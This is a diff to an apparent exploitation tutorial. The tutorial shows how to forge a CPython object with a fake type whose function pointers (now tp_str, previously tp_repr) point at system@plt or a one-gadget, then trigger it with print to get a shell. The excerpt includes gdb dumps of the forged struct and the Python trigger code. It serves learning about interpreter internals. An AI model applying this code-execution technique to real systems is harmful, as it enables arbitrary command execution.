@@ -69,7 +69,7 @@ PyTypeObject *ob_type;
 ```
 
 We can define a field in order to execute what we want.
-An interesting one is `tp_repr`, why? Let's look at the function `PyObject_Str`:
+An interesting one is `tp_str`, why? Let's look at the function `PyObject_Str`:
 
 ```c++
 0x5555556c9f20 <PyObject_Str+320> call   r11
@@ -77,7 +77,7 @@ An interesting one is `tp_repr`, why? Let's look at the function `PyObject_Str`:
 
 If we're able to control the value of `r11`, we can jump to any address we want!
 
-`tp_repr` is going to be called each time we pass an object to `print` or `repr`
+`tp_str` is going to be called each time we pass an object to `print` or `repr`
 
 Now, we just need to create a fake object with our fake type.
 Objects in python are defined as follow:
@@ -98,25 +98,31 @@ So we can create an object like this:
 
 ### Using a one gadget
 
-Since we only call a function without passing arguments to it, we can use a one gadget and hoping it works. We need 112 bytes in order to define the field `tp_repr`:
+Since we only call a function without passing arguments to it, we can use a one gadget and hoping it works. We need 112 bytes in order to define the field `tp_str`:
 ```c++
 {
   ob_base = {
     ob_base = {
-      ob_refcnt = 0x52,
-      ob_type = 0x555555acb9a0 <PyType_Type>
+      ob_refcnt = 0x1,
+      ob_type = 0x555555acb180 <PyBytes_Type>
     },
-    ob_size = 0x0
+    ob_size = 0x70
   },
-  tp_name = 0x555555891a72 "type",
-  tp_basicsize = 0x378,
-  tp_itemsize = 0x28,
-  tp_dealloc = 0x555555724490 <type_dealloc>,
-  tp_vectorcall_offset = 0x190,
-  tp_getattr = 0x0,
-  tp_setattr = 0x0,
-  tp_as_async = 0x0,
-  tp_repr = 0x555555792990 <type_repr>,
+  tp_name = 0xffffffffffffffff <error: Cannot access memory at address 0xffffffffffffffff>,
+  tp_basicsize = 0x5555555c3464,
+  tp_itemsize = 0x5555555c3464,
+  tp_dealloc = 0x5555555c3464 <system@plt+4>,
+  tp_vectorcall_offset = 0x5555555c3464,
+  tp_getattr = 0x5555555c3464 <system@plt+4>,
+  tp_setattr = 0x5555555c3464 <system@plt+4>,
+  tp_as_async = 0x5555555c3464 <system@plt+4>,
+  tp_repr = 0x5555555c3464 <system@plt+4>,
+  tp_as_number = 0x5555555c3464 <system@plt+4>,
+  tp_as_sequence = 0x5555555c3464 <system@plt+4>,
+  tp_as_mapping = 0x5555555c3464 <system@plt+4>,
+  tp_hash = 0x5555555c3464 <system@plt+4>,
+  tp_call = 0x5555555c3464 <system@plt+4>,
+  tp_str = 0x5555555c3464 <system@plt+4>,
   [...]
 ```
 
@@ -145,7 +151,7 @@ print(f"[ + ] Fake object id: {hex(id(fake_object))}")
 
 b = PyObj_FromPtr(id(fake_object) + 0x20)
 
-print(b) # Here we trigger tp_repr
+print(b) # Here we trigger tp_str
 ```
 
 Result:
@@ -213,7 +219,7 @@ print(f"[ + ] Fake object id: {hex(id(fake_object))}")
 
 b = PyObj_FromPtr(id(fake_object) + 0x20)
 
-print(b) # Here we trigger tp_repr
+print(b) # Here we trigger tp_str
 ```
 
 And... We got a shell!
@@ -251,7 +257,7 @@ repr(b)
 ```
 
 ## Note
-Since we there are other fields before `tp_repr`, we can trigger the call with something like this:
+Since we there are other fields before `tp_str`, we can trigger the call with something like this:
 
 ```py
 b.a
